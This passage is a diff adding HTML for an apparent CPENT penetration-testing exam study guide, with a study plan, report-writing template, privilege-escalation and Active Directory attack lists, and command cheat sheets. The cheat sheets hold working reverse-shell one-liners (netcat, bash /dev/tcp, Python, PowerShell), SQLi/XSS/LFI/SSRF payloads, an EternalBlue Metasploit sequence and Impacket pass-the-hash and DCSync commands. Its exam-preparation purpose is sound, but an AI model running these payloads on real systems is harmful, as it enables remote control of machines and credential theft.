+            <div class="tool-item reveal">
+                <i class="fas fa-user-secret"></i>
+                <h4>Mimikatz</h4>
+                <p>Credential dumping</p>
+            </div>
+            <div class="tool-item reveal">
+                <i class="fas fa-network-wired"></i>
+                <h4>Wireshark</h4>
+                <p>Traffic analysis</p>
+            </div>
+            <div class="tool-item reveal">
+                <i class="fas fa-code"></i>
+                <h4>Ghidra</h4>
+                <p>Reverse engineering</p>
+            </div>
+            <div class="tool-item reveal">
+                <i class="fas fa-python"></i>
+                <h4>pwntools</h4>
+                <p>Exploit development</p>
+            </div>
+            <div class="tool-item reveal">
+                <i class="fas fa-search"></i>
+                <h4>Responder</h4>
+                <p>LLMNR/NBT-NS poison</p>
+            </div>
+            <div class="tool-item reveal">
+                <i class="fas fa-satellite-dish"></i>
+                <h4>Shodan</h4>
+                <p>Internet scanner</p>
+            </div>
+            <div class="tool-item reveal">
+                <i class="fas fa-wifi"></i>
+                <h4>Aircrack-ng</h4>
+                <p>WiFi cracking</p>
+            </div>
+            <div class="tool-item reveal">
+                <i class="fas fa-cloud"></i>
+                <h4>Pacu</h4>
+                <p>AWS exploitation</p>
+            </div>
+            <div class="tool-item reveal">
+                <i class="fas fa-project-diagram"></i>
+                <h4>BloodHound</h4>
+                <p>AD path analysis</p>
+            </div>
+            <div class="tool-item reveal">
+                <i class="fas fa-terminal"></i>
+                <h4>Netcat</h4>
+                <p>Network utility</p>
+            </div>
+            <div class="tool-item reveal">
+                <i class="fas fa-exchange-alt"></i>
+                <h4>Impacket</h4>
+                <p>Network protocols</p>
+            </div>
+            <div class="tool-item reveal">
+                <i class="fas fa-microchip"></i>
+                <h4>radare2</h4>
+                <p>Binary analysis</p>
+            </div>
+            <div class="tool-item reveal">
+                <i class="fas fa-folder-open"></i>
+                <h4>binwalk</h4>
+                <p>Firmware analysis</p>
+            </div>
+            <div class="tool-item reveal">
+                <i class="fas fa-globe"></i>
+                <h4>Nikto</h4>
+                <p>Web server scanner</p>
+            </div>
+            <div class="tool-item reveal">
+                <i class="fas fa-hat-wizard"></i>
+                <h4>SET Toolkit</h4>
+                <p>Social engineering</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- Study Plan Section -->
+    <section id="study-plan">
+        <div class="section-header reveal">
+            <div class="section-tag">Roadmap</div>
+            <h2>8-Week Study Plan</h2>
+            <p>Follow this structured plan to prepare for the CPENT exam systematically.</p>
+        </div>
+        <div class="timeline">
+            <div class="timeline-item reveal">
+                <div class="timeline-dot"></div>
+                <div class="timeline-content">
+                    <div class="timeline-week">Week 1-2</div>
+                    <h3>Foundations</h3>
+                    <p>Master Linux CLI, networking basics (TCP/IP, OSI), and Python/Bash scripting. Set up your Kali lab environment.</p>
+                </div>
+            </div>
+            <div class="timeline-item reveal">
+                <div class="timeline-dot"></div>
+                <div class="timeline-content">
+                    <div class="timeline-week">Week 3</div>
+                    <h3>OSINT & Social Engineering</h3>
+                    <p>Practice OSINT gathering with Maltego, Recon-ng. Build phishing campaigns with SET. Complete Module 03 & 04 labs.</p>
+                </div>
+            </div>
+            <div class="timeline-item reveal">
+                <div class="timeline-dot"></div>
+                <div class="timeline-content">
+                    <div class="timeline-week">Week 4</div>
+                    <h3>Network Penetration</h3>
+                    <p>Master Nmap scanning, Metasploit exploitation, and internal network attacks. Practice with Metasploitable & HackTheBox.</p>
+                </div>
+            </div>
+            <div class="timeline-item reveal">
+                <div class="timeline-dot"></div>
+                <div class="timeline-content">
+                    <div class="timeline-week">Week 5</div>
+                    <h3>Web Application Testing</h3>
+                    <p>Deep dive into OWASP Top 10. Practice SQLi, XSS, SSRF on DVWA, WebGoat, and PortSwigger labs.</p>
+                </div>
+            </div>
+            <div class="timeline-item reveal">
+                <div class="timeline-dot"></div>
+                <div class="timeline-content">
+                    <div class="timeline-week">Week 6</div>
+                    <h3>Wireless, IoT & Cloud</h3>
+                    <p>WiFi attacks with Aircrack-ng, IoT firmware analysis with binwalk, and cloud exploitation with Pacu.</p>
+                </div>
+            </div>
+            <div class="timeline-item reveal">
+                <div class="timeline-dot"></div>
+                <div class="timeline-content">
+                    <div class="timeline-week">Week 7</div>
+                    <h3>Binary & OT/SCADA</h3>
+                    <p>Buffer overflows on OverTheWire, ROP challenges. Study SCADA protocols and GRFICSv2 lab.</p>
+                </div>
+            </div>
+            <div class="timeline-item reveal">
+                <div class="timeline-dot"></div>
+                <div class="timeline-content">
+                    <div class="timeline-week">Week 8</div>
+                    <h3>Full Practice & Report Writing</h3>
+                    <p>Take mock exams, practice report writing, and review weak areas. Focus on time management and documentation.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Tips Section -->
+    <section id="tips">
+        <div class="section-header reveal">
+            <div class="section-tag">Pro Tips</div>
+            <h2>Exam Success Tips</h2>
+            <p>These tips will help you maximize your score and pass the CPENT exam.</p>
+        </div>
+        <div class="tips-grid">
+            <div class="tip-card reveal">
+                <div class="tip-number">01</div>
+                <h3>Master Report Writing</h3>
+                <p>Your report is 30% of your score. Document every finding with clear PoCs, screenshots, and business impact. Use professional templates.</p>
+            </div>
+            <div class="tip-card reveal">
+                <div class="tip-number">02</div>
+                <h3>Time Management</h3>
+                <p>You get ~24 hours. Spend the first 2 hours planning. Allocate time per task. Don't get stuck on one vulnerability — move on and come back.</p>
+            </div>
+            <div class="tip-card reveal">
+                <div class="tip-number">03</div>
+                <h3>Focus on Exploitation</h3>
+                <p>Most points come from successful exploitation and post-exploitation. Practice getting shells and pivoting through networks.</p>
+            </div>
+            <div class="tip-card reveal">
+                <div class="tip-number">04</div>
+                <h3>Know Your Tools</h3>
+                <p>Be fluent in Nmap, Metasploit, Burp Suite, and Impacket. Practice offline — don't rely on GUI tools during the exam.</p>
+            </div>
+            <div class="tip-card reveal">
+                <div class="tip-number">05</div>
+                <h3>Active Directory is Key</h3>
+                <p>AD attacks are heavily tested. Master Kerberoasting, DCSync, Pass-the-Hash, and BloodHound analysis.</p>
+            </div>
+            <div class="tip-card reveal">
+                <div class="tip-number">06</div>
+                <h3>Practice in Kali</h3>
+                <p>The exam environment is Kali-based. Be comfortable with the terminal, Kali tools, and command-line workflows.</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- Report Writing Section -->
+    <section id="report-writing">
+        <div class="section-header reveal">
+            <div class="section-tag">Documentation</div>
+            <h2>Report Writing Guide</h2>
+            <p>Report writing is 30% of your CPENT score. Follow this structure for maximum points.</p>
+        </div>
+
+        <!-- Report Structure -->
+        <div class="report-template reveal">
+            <h3><i class="fas fa-file-alt" style="margin-right: 0.5rem;"></i> Professional Report Structure</h3>
+
+            <div class="report-section">
+                <h4>1. Cover Page</h4>
+                <p>Include: Report title, client name, engagement dates, your name, "CONFIDENTIAL" marking, version number. Use the EC-Council template from your downloads folder.</p>
+            </div>
+
+            <div class="report-section">
+                <h4>2. Table of Contents</h4>
+                <p>Auto-generate in Word/LaTeX. Include all sections, figures, and appendices with page numbers.</p>
+            </div>
+
+            <div class="report-section">
+                <h4>3. Executive Summary (1 page max)</h4>
+                <p>Non-technical overview for C-level executives. State: what was tested, key findings count, overall risk rating, top 3 critical recommendations. Use simple language — no jargon.</p>
+            </div>
+
+            <div class="report-section">
+                <h4>4. Engagement Overview</h4>
+                <p>Scope: IP ranges, domains, applications tested. Methodology: PTES/OWASP framework used. Tools list. Rules of engagement. Testing dates and times. Contact information.</p>
+            </div>
+
+            <div class="report-section">
+                <h4>5. Risk Assessment Summary</h4>
+                <p>Create a risk matrix table showing findings by severity:
+
+| Severity | Count | Example |
+|----------|-------|---------|
+| Critical | X | RCE, SQLi with data dump |
+| High | X | Auth bypass, PrivEsc |
+| Medium | X | XSS, misconfig |
+| Low | X | Info disclosure, header missing |
+| Informational | X | Version leak |</p>
+            </div>
+
+            <div class="report-section">
+                <h4>6. Detailed Findings (MOST IMPORTANT)</h4>
+                <p>For EACH finding, include these sections:
+
+<strong>Title:</strong> [Vuln Type] in [Component] leading to [Impact]
+
+<strong>Severity:</strong> Critical/High/Medium/Low + CVSS 3.1 Score
+
+<strong>CVSS Vector:</strong> AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+
+<strong>Description:</strong> What the vulnerability is and why it matters
+
+<strong>Affected System:</strong> URL, IP, port, parameter
+
+<strong>Steps to Reproduce:</strong>
+1. Navigate to https://target.com/login
+2. Enter: admin' OR 1=1--
+3. Click Login
+4. Observe: Dashboard loads without authentication
+
+<strong>Proof of Concept:</strong>
+- Screenshots with red boxes highlighting the issue
+- Raw HTTP requests/responses (use Burp Suite)
+- Terminal output showing exploitation
+
+<strong>Impact:</strong> Business impact — data breach, financial loss, compliance violation
+
+<strong>Remediation:</strong> Specific fix recommendations with code examples
+
+<strong>References:</strong> CWE, OWASP, CVE links</p>
+            </div>
+
+            <div class="report-section">
+                <h4>7. Recommendations Summary</h4>
+                <p>Prioritized list of all fixes. Short-term (immediate) vs long-term (architecture) recommendations. Resource/cost estimates if possible.</p>
+            </div>
+
+            <div class="report-section">
+                <h4>8. Appendix</h4>
+                <p>Full Nmap scan output. Tool output logs. Additional screenshots. Glossary of terms. Methodology details.</p>
+            </div>
+        </div>
+
+        <!-- Report Writing Tips -->
+        <div class="tips-grid" style="margin-top: 3rem;">
+            <div class="tip-card reveal">
+                <div class="tip-number" style="font-size: 2rem;"><i class="fas fa-camera"></i></div>
+                <h3>Always Include Screenshots</h3>
+                <p>Every finding needs visual proof. Use green/red boxes to highlight. Show before & after. Capture terminal output and browser responses.</p>
+            </div>
+            <div class="tip-card reveal">
+                <div class="tip-number" style="font-size: 2rem;"><i class="fas fa-clipboard-list"></i></div>
+                <h3>Copy-Pasteable Requests</h3>
+                <p>Include raw HTTP requests so the reader can reproduce. Format them in code blocks. Show exact headers, body, and parameters.</p>
+            </div>
+            <div class="tip-card reveal">
+                <div class="tip-number" style="font-size: 2rem;"><i class="fas fa-chart-bar"></i></div>
+                <h3>Use CVSS Scoring</h3>
+                <p>Every finding needs a CVSS 3.1 vector. Use the calculator at first.org. Be consistent — don't inflate severity.</p>
+            </div>
+            <div class="tip-card reveal">
+                <div class="tip-number" style="font-size: 2rem;"><i class="fas fa-spell-check"></i></div>
+                <h3>Professional Language</h3>
+                <p>No typos. No slang. Use "the tester" not "I". Passive voice for findings. Active voice for recommendations. Be factual.</p>
+            </div>
+            <div class="tip-card reveal">
+                <div class="tip-number" style="font-size: 2rem;"><i class="fas fa-bullseye"></i></div>
+                <h3>Business Impact Focus</h3>
+                <p>Executives don't care about SQL syntax — they care about data breaches. Translate technical risk to business risk in every finding.</p>
+            </div>
+            <div class="tip-card reveal">
+                <div class="tip-number" style="font-size: 2rem;"><i class="fas fa-tools"></i></div>
+                <h3>Actionable Remediation</h3>
+                <p>Don't say "sanitize input" — say "use parameterized queries with PreparedStatement". Give code examples when possible.</p>
+            </div>
+        </div>
+
+        <!-- CVSS Calculator Link -->
+        <div style="text-align: center; margin-top: 3rem;" class="reveal">
+            <a href="https://www.first.org/cvss/calculator/3.1" target="_blank" class="btn btn-primary">
+                <i class="fas fa-calculator"></i> Open CVSS 3.1 Calculator
+            </a>
+        </div>
+    </section>
+
+    <!-- Privilege Escalation & AD Section -->
+    <section id="privesc">
+        <div class="section-header reveal">
+            <div class="section-tag">Critical Skills</div>
+            <h2>Privilege Escalation & Active Directory</h2>
+            <p>These topics are heavily tested. Master both Linux and Windows privesc plus AD attacks.</p>
+        </div>
+
+        <div class="privesc-grid">
+            <!-- Linux Privesc -->
+            <div class="privesc-card reveal">
+                <div class="privesc-header">
+                    <div class="privesc-icon" style="background: rgba(0, 212, 255, 0.15); color: #00d4ff;"><i class="fab fa-linux"></i></div>
+                    <h3>Linux Privilege Escalation</h3>
+                </div>
+                <ul class="privesc-list">
+                    <li>SUID/SGID binaries (find / -perm -4000)</li>
+                    <li>Sudo misconfigurations (sudo -l)</li>
+                    <li>Cron job exploitation</li>
+                    <li>Kernel exploits (DirtyPipe, DirtyCow)</li>
+                    <li>Capabilities (getcap -r /)</li>
+                    <li>Writable /etc/passwd</li>
+                    <li>NFS root squashing bypass</li>
+                    <li>PATH manipulation</li>
+                    <li>Wildcard injection (tar, rsync)</li>
+                    <li>LXD/LXC group escalation</li>
+                </ul>
+            </div>
+
+            <!-- Windows Privesc -->
+            <div class="privesc-card reveal">
+                <div class="privesc-header">
+                    <div class="privesc-icon" style="background: rgba(124, 58, 237, 0.15); color: #7c3aed;"><i class="fab fa-windows"></i></div>
+                    <h3>Windows Privilege Escalation</h3>
+                </div>
+                <ul class="privesc-list">
+                    <li>Token impersonation (Potato attacks)</li>
+                    <li>Unquoted service paths</li>
+                    <li>AlwaysInstallElevated</li>
+                    <li>Weak service permissions</li>
+                    <li>Scheduled tasks</li>
+                    <li>DLL hijacking / search order</li>
+                    <li>Registry autoruns</li>
+                    <li>Insecure GUI apps (UAC bypass)</li>
+                    <li>Stored credentials (cmdkey /list)</li>
+                    <li>Kernel exploits (RottenPotato, JuicyPotato)</li>
+                </ul>
+            </div>
+
+            <!-- Active Directory Attacks -->
+            <div class="privesc-card reveal">
+                <div class="privesc-header">
+                    <div class="privesc-icon" style="background: rgba(255, 51, 102, 0.15); color: #ff3366;"><i class="fas fa-network-wired"></i></div>
+                    <h3>Active Directory Attacks</h3>
+                </div>
+                <ul class="privesc-list">
+                    <li>Kerberoasting (impacket-GetUserSPNs)</li>
+                    <li>AS-REP Roasting (GetNPUsers.py)</li>
+                    <li>Pass-the-Hash (psexec.py)</li>
+                    <li>Pass-the-Ticket (ticketConverter)</li>
+                    <li>DCSync (secretsdump.py)</li>
+                    <li>Golden/Silver Ticket attacks</li>
+                    <li>NTLM Relay (ntlmrelayx.py)</li>
+                    <li>LDAP signing bypass</li>
+                    <li>Unconstrained delegation</li>
+                    <li>ACL abuse paths</li>
+                </ul>
+            </div>
+
+            <!-- AD Enumeration -->
+            <div class="privesc-card reveal">
+                <div class="privesc-header">
+                    <div class="privesc-icon" style="background: rgba(0, 255, 136, 0.15); color: #00ff88;"><i class="fas fa-search"></i></div>
+                    <h3>AD Enumeration Tools</h3>
+                </div>
+                <ul class="privesc-list">
+                    <li>BloodHound — attack path visualization</li>
+                    <li>SharpHound — data collection</li>
+                    <li>PowerView — PowerShell enumeration</li>
+                    <li>ldapdomaindump — LDAP info dump</li>
+                    <li>CrackMapExec — network exploitation</li>
+                    <li>enum4linux — SMB enumeration</li>
+                    <li>ldapsearch — LDAP queries</li>
+                    <li>ADRecon — comprehensive AD report</li>
+                    <li>Rubeus — Kerberos attacks</li>
+                    <li>ADIDNS — DNS record enumeration</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Privesc Tools Quick Reference -->
+        <div style="margin-top: 3rem;" class="reveal">
+            <h3 style="margin-bottom: 1.5rem; text-align: center;">Quick Reference — Privesc Tools</h3>
+            <div class="tools-container">
+                <div class="tool-item reveal">
+                    <i class="fas fa-search-plus"></i>
+                    <h4>LinPEAS</h4>
+                    <p>Linux enum script</p>
+                </div>
+                <div class="tool-item reveal">
+                    <i class="fas fa-windows"></i>
+                    <h4>WinPEAS</h4>
+                    <p>Windows enum script</p>
+                </div>
+                <div class="tool-item reveal">
+                    <i class="fas fa-project-diagram"></i>
+                    <h4>BloodHound</h4>
+                    <p>AD path analysis</p>
+                </div>
+                <div class="tool-item reveal">
+                    <i class="fas fa-user-secret"></i>
+                    <h4>Mimikatz</h4>
+                    <p>Credential dump</p>
+                </div>
+                <div class="tool-item reveal">
+                    <i class="fas fa-exchange-alt"></i>
+                    <h4>Impacket</h4>
+                    <p>AD attack suite</p>
+                </div>
+                <div class="tool-item reveal">
+                    <i class="fas fa-hammer"></i>
+                    <h4>Metasploit</h4>
+                    <p>Exploit framework</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Cheat Sheets Section -->
+    <section id="cheatsheets">
+        <div class="section-header reveal">
+            <div class="section-tag">Quick Reference</div>
+            <h2>Exam Day Cheat Sheets</h2>
+            <p>Keep these commands handy during your exam practice.</p>
+        </div>
+
+        <div class="cheatsheet-grid">
+            <!-- Nmap Cheat Sheet -->
+            <div class="cheatsheet-card reveal">
+                <div class="cheatsheet-header">
+                    <i class="fas fa-crosshairs"></i>
+                    <h3>Nmap Scanning</h3>
+                </div>
+                <div class="cheatsheet-body">
+                    <pre><code># Quick scan
+nmap -sV -sC target_ip
+
+# Full port scan
+nmap -p- -T4 target_ip
+
+# UDP scan
+nmap -sU --top-ports 50 target_ip
+
+# Stealth scan
+nmap -sS -T2 target_ip
+
+# Vulnerability scan
+nmap --script vuln target_ip
+
+# OS detection
+nmap -O target_ip
+
+# Aggressive scan
+nmap -A -T4 target_ip</code></pre>
+                </div>
+            </div>
+
+            <!-- Metasploit Cheat Sheet -->
+            <div class="cheatsheet-card reveal">
+                <div class="cheatsheet-header">
+                    <i class="fas fa-bug"></i>
+                    <h3>Metasploit</h3>
+                </div>
+                <div class="cheatsheet-body">
+                    <pre><code># Search exploits
+msfconsole
+search type:exploit platform:windows
+
+# Use exploit
+use exploit/windows/smb/ms17_010_eternalblue
+
+# Set options
+set RHOSTS target_ip
+set LHOST your_ip
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+
+# Run
+exploit
+
+# Post exploitation
+sysinfo
+getuid
+hashdump
+shell</code></pre>
+                </div>
+            </div>
+
+            <!-- Reverse Shells Cheat Sheet -->
+            <div class="cheatsheet-card reveal">
+                <div class="cheatsheet-header">
+                    <i class="fas fa-terminal"></i>
+                    <h3>Reverse Shells</h3>
+                </div>
+                <div class="cheatsheet-body">
+                    <pre><code># Netcat (Linux)
+nc -e /bin/bash YOUR_IP 4444
+
+# Bash
+bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
+
+# Python
+python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+# PowerShell
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('YOUR_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</code></pre>
+                </div>
+            </div>
+
+            <!-- Privilege Escalation Cheat Sheet -->
+            <div class="cheatsheet-card reveal">
+                <div class="cheatsheet-header">
+                    <i class="fas fa-arrow-up"></i>
+                    <h3>Privilege Escalation</h3>
+                </div>
+                <div class="cheatsheet-body">
+                    <pre><code># Linux Enumeration
+id && whoami
+cat /etc/passwd
+sudo -l
+find / -perm -4000 2>/dev/null
+cat /etc/crontab
+uname -a
+
+# Windows Enumeration
+whoami /all
+systeminfo
+net user
+net localgroup administrators
+wmic service list brief
+tasklist /svc
+ipconfig /all</code></pre>
+                </div>
+            </div>
+
+            <!-- Web Attacks Cheat Sheet -->
+            <div class="cheatsheet-card reveal">
+                <div class="cheatsheet-header">
+                    <i class="fas fa-globe"></i>
+                    <h3>Web Attacks</h3>
+                </div>
+                <div class="cheatsheet-body">
+                    <pre><code># SQL Injection
+' OR 1=1 --
+' UNION SELECT null,table_name FROM information_schema.tables --
+' AND SLEEP(5) --
+sqlmap -u "url?id=1" --dbs
+
+# XSS
+&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;
+
+# SSRF
+http://127.0.0.1/admin
+http://localhost:22
+http://[::1]
+
+# LFI
+../../../../etc/passwd
+....//....//....//etc/passwd
+php://filter/convert.base64-encode/resource=index.php</code></pre>
+                </div>
+            </div>
+
+            <!-- Impacket Cheat Sheet -->
+            <div class="cheatsheet-card reveal">
+                <div class="cheatsheet-header">
+                    <i class="fas fa-exchange-alt"></i>
+                    <h3>Impacket Suite</h3>
+                </div>
+                <div class="cheatsheet-body">
+                    <pre><code># Pass the Hash
+psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:da76f...
+impacket-wmiexec domain/user:password@target_ip
+
+# Kerberoasting
+impacket-GetUserSPNs domain/user:password -dc-ip dc_ip -request
+
+# Secrets Dump
+impacket-secretsdump domain/user:password@target_ip
+
+# DCSync
+impacket-secretsdump domain/user:password@dc_ip -just-dc-ntlm
+
+# AS-REP Roasting
+impacket-GetNPUsers domain/ -usersfile users.txt -format hashcat -outputfile asrep.txt</code></pre>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Resources Section -->
+    <section id="resources">
+        <div class="section-header reveal">
+            <div class="section-tag">Learning</div>
+            <h2>Study Resources</h2>
+            <p>Books, YouTube channels, and communities to accelerate your learning.</p>
+        </div>
+
+        <div class="resources-grid">
+            <div class="resource-card reveal">
+                <div class="resource-category">Books</div>
+                <h3>Essential Reading</h3>
+                <ul class="resource-list">
+                    <li><a href="https://www.amazon.com/Penetration-Testing-Hands-On-Introduction/dp/1593275641" target="_blank">Penetration Testing — Georgia Weidman</a></li>
+                    <li><a href="https://www.amazon.com/Hacking-Art-Exploitation-Jon-Erickson/dp/1593271441" target="_blank">Hacking: The Art of Exploitation</a></li>
+                    <li><a href="https://www.amazon.com/Web-Application-Hackers-Handbook/dp/1118026470" target="_blank">The Web App Hacker's Handbook</a></li>
+                    <li><a href="https://www.amazon.com/Red-Team-Field-Manual/dp/1494791957" target="_blank">The Red Team Field Manual (RTFM)</a></li>
+                    <li><a href="https://www.amazon.com/Blue-Team-Field-Manual/dp/154101636X" target="_blank">The Blue Team Field Manual (BTFM)</a></li>
+                    <li><a href="https://www.amazon.com/Black-Hat-Python-Programming-Pentesters/dp/1593275900" target="_blank">Black Hat Python — Justin Seitz</a></li>
+                </ul>
+            </div>
+
+            <div class="resource-card reveal">
+                <div class="resource-category">YouTube</div>
+                <h3>Free Video Training</h3>
+                <ul class="resource-list">
+                    <li><a href="https://www.youtube.com/@IppSec" target="_blank">IppSec — HackTheBox walkthroughs</a></li>
+                    <li><a href="https://www.youtube.com/@NetworkChuck" target="_blank">NetworkChuck — Networking & Hacking</a></li>
+                    <li><a href="https://www.youtube.com/@JohnHammond010" target="_blank">John Hammond — CTF & Exploits</a></li>
+                    <li><a href="https://www.youtube.com/@TheCyberMentor" target="_blank">The Cyber Mentor — Ethical Hacking</a></li>
+                    <li><a href="https://www.youtube.com/@hacker_spice" target="_blank">HackerSpice — Pentesting Tutorials</a></li>
+                    <li><a href="https://www.youtube.com/@liveoverflow" target="_blank">LiveOverflow — Binary Exploitation</a></li>
+                </ul>
+            </div>
+
+            <div class="resource-card reveal">
+                <div class="resource-category">Cheat Sheets</div>
+                <h3>Quick References</h3>
+                <ul class="resource-list">
+                    <li><a href="https://gtfobins.github.io" target="_blank">GTFOBins — Linux privesc binaries</a></li>
+                    <li><a href="https://lolbas-project.github.io" target="_blank">LOLBAS — Windows living-off-the-land</a></li>
+                    <li><a href="https://book.hacktricks.xyz" target="_blank">HackTricks — Comprehensive pentesting</a></li>
+                    <li><a href="https://cheatsheetseries.owasp.org" target="_blank">OWASP Cheat Sheet Series</a></li>
+                    <li><a href="https://pentestmonkey.net/cheat-sheet" target="_blank">PentestMonkey — Reverse shells</a></li>
+                    <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank">PayloadsAllTheThings</a></li>
+                </ul>
+            </div>
+
+            <div class="resource-card reveal">
+                <div class="resource-category">Communities</div>
+                <h3>Join & Learn</h3>
+                <ul class="resource-list">
+                    <li><a href="https://www.reddit.com/r/netsec" target="_blank">r/netsec — Reddit community</a></li>
+                    <li><a href="https://www.reddit.com/r/hacking" target="_blank">r/hacking — Reddit community</a></li>
+                    <li><a href="https://discord.gg/hackthebox" target="_blank">HackTheBox Discord</a></li>
+                    <li><a href="https://discord.gg/tryhackme" target="_blank">TryHackMe Discord</a></li>
+                    <li><a href="https://www.offensive-security.com/community/" target="_blank">OffSec Community</a></li>
+                    <li><a href="https://owasp.org/chapter/" target="_blank">OWASP Local Chapters</a></li>
+                </ul>
+            </div>
+        </div>
+    </section>
+
+    <!-- About CPENT Section -->
+    <section id="about">
+        <div class="section-header reveal">
+            <div class="section-tag">Info</div>
+            <h2>About CPENT Exam</h2>
+            <p>Everything you need to know about the certification and exam format.</p>
+        </div>
+
+        <!-- Certification Levels -->
+        <div class="about-grid" style="margin-bottom: 3rem;">
+            <div class="about-card reveal" style="border-color: var(--accent-green);">
+                <i class="fas fa-medal" style="color: var(--accent-green); font-size: 2.5rem;"></i>
+                <h3 style="font-size: 1.3rem;">CPENT Certification</h3>
+                <p style="font-size: 1.1rem; color: var(--accent-green); font-weight: 700; margin: 0.5rem 0;">70% or more</p>
+                <p>Certified Penetration Testing Professional. Demonstrates practical penetration testing skills.</p>
+            </div>
+            <div class="about-card reveal" style="border-color: var(--accent-yellow);">
+                <i class="fas fa-crown" style="color: var(--accent-yellow); font-size: 2.5rem;"></i>
+                <h3 style="font-size: 1.3rem;">LPT Master</h3>
+                <p style="font-size: 1.1rem; color: var(--accent-yellow); font-weight: 700; margin: 0.5rem 0;">90% or more</p>
+                <p>Licensed Penetration Tester Master. Elite certification for top performers.</p>
+            </div>
+        </div>
+
+        <!-- Exam Format -->
+        <div class="about-grid">
+            <div class="about-card reveal">
+                <i class="fas fa-clock" style="color: var(--accent);"></i>
+                <h3>Duration</h3>
+                <p>Choose: single 24-hour session OR two 12-hour sessions. 30-day window to schedule.</p>
+            </div>
+            <div class="about-card reveal">
+                <i class="fas fa-laptop-code" style="color: var(--accent-secondary);"></i>
+                <h3>Format</h3>
+                <p>100% hands-on. Remotely proctored. No multiple choice. Real exploitation + report.</p>
+            </div>
+            <div class="about-card reveal">
+                <i class="fas fa-server" style="color: var(--accent-green);"></i>
+                <h3>Environment</h3>
+                <p>Kali/Parrot Linux VM. OpenVPN access. Remote desktop. Enterprise-style network.</p>
+            </div>
+            <div class="about-card reveal">
+                <i class="fas fa-webcam" style="color: var(--accent-red);"></i>
+                <h3>Proctoring</h3>
+                <p>Webcam required. Live proctor monitors your session. One monitor only.</p>
+            </div>
+            <div class="about-card reveal">
+                <i class="fas fa-certificate" style="color: var(--accent-yellow);"></i>
+                <h3>Validity</h3>
+                <p>Certification valid for 3 years. Requires 120 ECE credits to renew.</p>
+            </div>
+            <div class="about-card reveal">
+                <i class="fas fa-file-alt" style="color: var(--accent-orange);"></i>
+                <h3>Report Required</h3>
+                <p>Must submit professional pen test report within 30 days. Results in 7 working days.</p>
+            </div>
+            <div class="about-card reveal">
+                <i class="fas fa-desktop" style="color: var(--accent);"></i>
+                <h3>System Requirements</h3>
+                <p>Intel i3/AMD Ryzen 3, 8GB RAM (16GB recommended), 60GB SSD, webcam.</p>
+            </div>
+            <div class="about-card reveal">
+                <i class="fas fa-ban" style="color: var(--accent-red);"></i>
+                <h3>Prohibited</h3>
+                <p>No DoS, no malware, no attacking outside scope, no collaboration, one monitor only.</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- Exam Zones Section -->
+    <section id="exam-zones">
+        <div class="section-header reveal">
+            <div class="section-tag">Exam Zones</div>
+            <h2>CPENT Exam Zones</h2>
+            <p>The exam environment is divided into 5 zones. Each tests different skills.</p>
+        </div>
+
+        <div class="modules-grid">
+            <!-- AD Zone -->
+            <div class="module-card reveal" data-module="ad">
+                <div class="module-header">
+                    <div class="module-icon red"><i class="fas fa-network-wired"></i></div>
+                    <div>
+                        <div class="module-number">Zone 1</div>
+                        <div class="module-title">Active Directory</div>
+                    </div>
+                </div>
+                <div class="module-desc">Enterprise AD forest exploitation. Pivot through machines to reach the Domain Controller.</div>
+                <div class="module-topics">
+                    <span class="topic-tag">Domain Controller</span>
+                    <span class="topic-tag">Forest Enumeration</span>
+                    <span class="topic-tag">Pivoting Required</span>
+                    <span class="topic-tag">Kerberos Attacks</span>
+                </div>
+                <button class="expand-btn" onclick="toggleExpand(this)">View Details <i class="fas fa-chevron-down"></i></button>
+                <div class="module-details">
+                    <h4>What to Expect:</h4>
+                    <ul>
+                        <li>Identify Domain Controller (likely not directly accessible)</li>
+                        <li>Pivot through compromised machines to reach AD</li>
+                        <li>Enumerate AD forest using BloodHound, PowerView</li>
+                        <li>Exploit Kerberos (Kerberoasting, AS-REP)</li>
+                        <li>Extract credentials via DCSync</li>
+                    </ul>
+                    <h4>Tools:</h4>
+                    <ul>
+                        <li>BloodHound, Impacket, Rubeus, CrackMapExec</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Binaries Zone -->
+            <div class="module-card reveal" data-module="binary">
+                <div class="module-header">
+                    <div class="module-icon orange"><i class="fas fa-code"></i></div>
+                    <div>
+                        <div class="module-number">Zone 2</div>
+                        <div class="module-title">Binaries</div>
+                    </div>
+                </div>
+                <div class="module-desc">Reverse engineer binaries, bypass filtering, create exploits for root access.</div>
+                <div class="module-topics">
+                    <span class="topic-tag">Reverse Engineering</span>
+                    <span class="topic-tag">Exploit Development</span>
+                    <span class="topic-tag">Filter Bypass</span>
+                    <span class="topic-tag">Root Flag</span>
+                </div>
+                <button class="expand-btn" onclick="toggleExpand(this)">View Details <i class="fas fa-chevron-down"></i></button>
+                <div class="module-details">
+                    <h4>What to Expect:</h4>
+                    <ul>
+                        <li>Identify filtering device protecting targets</li>
+                        <li>Map attack surface through filters</li>
+                        <li>Reverse engineer binary files (Ghidra, radare2)</li>
+                        <li>Answer questions from binary analysis</li>
+                        <li>Create exploit to gain root privileges</li>
+                    </ul>
+                    <h4>Key Skills:</h4>
+                    <ul>
